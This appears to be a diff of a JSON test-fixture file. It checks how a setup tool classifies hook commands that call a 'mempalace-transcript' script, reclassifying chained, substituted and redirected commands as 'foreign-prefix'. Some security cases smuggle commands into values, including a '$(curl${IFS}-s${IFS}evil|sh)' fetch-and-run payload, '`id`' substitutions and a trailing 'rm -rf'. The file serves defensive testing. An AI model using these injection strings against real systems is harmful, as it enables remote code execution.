@@ -236,18 +236,18 @@
   },
   {
     "command": "bash /opt/prep.sh && bash /repo/hooks/mempalace-transcript.sh",
-    "transcript": "no",
-    "note": "spec scenario: a chained operator command is never touched"
+    "transcript": "foreign-prefix",
+    "note": "spec scenario: a chained operator command is never touched — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "bash /repo/hooks/mempalace-transcript.sh; rm -rf /tmp/x",
-    "transcript": "no",
-    "note": "trailing command"
+    "transcript": "foreign-prefix",
+    "note": "trailing command — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "bash $(echo /repo)/hooks/mempalace-transcript.sh",
-    "transcript": "no",
-    "note": "command substitution"
+    "transcript": "foreign-prefix",
+    "note": "command substitution — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "bash \"/x/hooks/worktree-git-guard.sh\"",
@@ -286,28 +286,28 @@
   },
   {
     "command": "MEMPALACE_TRANSCRIPT_ENABLED=1 backup.sh;/bin/bash /repo/hooks/mempalace-transcript.sh",
-    "transcript": "no",
-    "note": "security S1: a `;` chain in the prefix"
+    "transcript": "foreign-prefix",
+    "note": "security S1: a `;` chain in the prefix — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=x;notify-send;true bash /repo/hooks/mempalace-transcript.sh",
-    "transcript": "no",
-    "note": "security S1: a `;` chain inside a prefix value"
+    "transcript": "foreign-prefix",
+    "note": "security S1: a `;` chain inside a prefix value — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=$(curl${IFS}-s${IFS}evil|sh) bash /repo/hooks/mempalace-transcript.sh",
-    "transcript": "no",
-    "note": "security S1: command substitution in a prefix value"
+    "transcript": "foreign-prefix",
+    "note": "security S1: command substitution in a prefix value — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=`id` bash /repo/hooks/mempalace-transcript.sh",
-    "transcript": "no",
-    "note": "security S1: backquote substitution in a prefix value"
+    "transcript": "foreign-prefix",
+    "note": "security S1: backquote substitution in a prefix value — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "MEMPALACE_TRANSCRIPT_ENABLED=1 node /a|/repo/hooks/mempalace-transcript.ts",
-    "transcript": "no",
-    "note": "security S1: a pipe inside the path"
+    "transcript": "foreign-prefix",
+    "note": "security S1: a pipe inside the path — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "prep&&/usr/bin/env bash /repo/hooks/mempalace-transcript.sh",
@@ -316,58 +316,58 @@
   },
   {
     "command": "prep;/bin/bash /repo/hooks/mempalace-transcript.sh",
-    "transcript": "no",
-    "note": "security S1: a `;` chain before the interpreter"
+    "transcript": "foreign-prefix",
+    "note": "security S1: a `;` chain before the interpreter — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "bash /opt/prep.sh;/repo/hooks/mempalace-transcript.sh",
-    "transcript": "no",
-    "note": "security S1: a `;` chain inside the unquoted path"
+    "transcript": "foreign-prefix",
+    "note": "security S1: a `;` chain inside the unquoted path — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "bash /opt/prep.sh&&/repo/mempalace-transcript.sh",
-    "transcript": "no",
-    "note": "security S1: an `&&` chain inside the unquoted path"
+    "transcript": "foreign-prefix",
+    "note": "security S1: an `&&` chain inside the unquoted path — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "bash \"$(prep)/repo/hooks/mempalace-transcript.sh\"",
-    "transcript": "no",
-    "note": "security S1: command substitution inside the quoted path"
+    "transcript": "foreign-prefix",
+    "note": "security S1: command substitution inside the quoted path — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "bash \"`prep`/repo/hooks/mempalace-transcript.sh\"",
-    "transcript": "no",
-    "note": "security S1: backquote substitution inside the quoted path"
+    "transcript": "foreign-prefix",
+    "note": "security S1: backquote substitution inside the quoted path — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "bash /repo/hooks/mempalace-transcript.sh\nprep",
-    "transcript": "no",
-    "note": "security S1: a newline-chained second command is not an event word"
+    "transcript": "foreign-prefix",
+    "note": "security S1: a newline-chained second command is not an event word — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "bash /repo/hooks/mempalace-transcript.sh Stop\r",
-    "transcript": "no",
-    "note": "security S1: a carriage return"
+    "transcript": "foreign-prefix",
+    "note": "security S1: a carriage return — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "bash \"$(pwd)/hooks/mempalace-transcript.sh\"",
-    "transcript": "no",
-    "note": "a command substitution inside the quoted path runs an operator's command first"
+    "transcript": "foreign-prefix",
+    "note": "a command substitution inside the quoted path runs an operator's command first — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "node \"`pwd`/hooks/mempalace-transcript.ts\" claude-code",
-    "transcript": "no",
-    "note": "a backtick substitution inside the quoted path, direct shape"
+    "transcript": "foreign-prefix",
+    "note": "a backtick substitution inside the quoted path, direct shape — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "X=$(id) node \"/x/hooks/mempalace-transcript.ts\" claude-code",
-    "transcript": "no",
-    "note": "a command substitution in a prefix value is not an operator's setting"
+    "transcript": "foreign-prefix",
+    "note": "a command substitution in a prefix value is not an operator's setting — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "bash '/x/$(id)/hooks/mempalace-transcript.sh'",
-    "transcript": "no",
-    "note": "no substitution is ever recognised, even a single-quoted literal one"
+    "transcript": "foreign-prefix",
+    "note": "no substitution is ever recognised, even a single-quoted literal one — i1-F5 owner ruling: a chained, substituted or redirected command is foreign-prefix (left, reported, nothing added)"
   },
   {
     "command": "MEMPALACE_TRANSCRIPT_ENABLED='1' bash /x/hooks/mempalace-transcript.sh",
@@ -453,5 +453,45 @@
     "command": "MEMPALACE_TRANSCRIPT_ENABLED=\"1\" bash \"/x/hooks/mempalace-transcript.sh\" Stop",
     "transcript": "foreign-prefix",
     "note": "i1-F5: double quote on the legacy Antigravity shape in the prefix: outside setup's grammar, foreign-prefix"
+  },
+  {
+    "command": "bash /x/hooks/mempalace-transcript.sh | tee /tmp/log",
+    "transcript": "foreign-prefix",
+    "note": "i1-F5: a pipe at the end of the command"
+  },
+  {
+    "command": "bash /x/hooks/mempalace-transcript.sh > /tmp/log",
+    "transcript": "foreign-prefix",
+    "note": "i1-F5: a redirection `>` at the end"
+  },
+  {
+    "command": "bash /x/hooks/mempalace-transcript.sh < /dev/null",
+    "transcript": "foreign-prefix",
+    "note": "i1-F5: a redirection `<` at the end"
+  },
+  {
+    "command": "bash /x/hooks/mempalace-transcript.sh &",
+    "transcript": "foreign-prefix",
+    "note": "i1-F5: a trailing `&`"
+  },
+  {
+    "command": "(bash /x/hooks/mempalace-transcript.sh)",
+    "transcript": "foreign-prefix",
+    "note": "i1-F5: a subshell in parentheses"
+  },
+  {
+    "command": "node \"/x/hooks/mempalace-transcript.ts\" claude-code; true",
+    "transcript": "foreign-prefix",
+    "note": "i1-F5: a `;` after the direct form"
+  },
+  {
+    "command": "cat /x/hooks/mempalace-transcript.sh.bak | wc -l",
+    "transcript": "no",
+    "note": "syntax, but no path word ending in mempalace-transcript.sh|ts"
+  },
+  {
+    "command": "echo mempalace-transcript.sh; ls",
+    "transcript": "no",
+    "note": "syntax, but the name is not a path word (no slash)"
   }
 ]
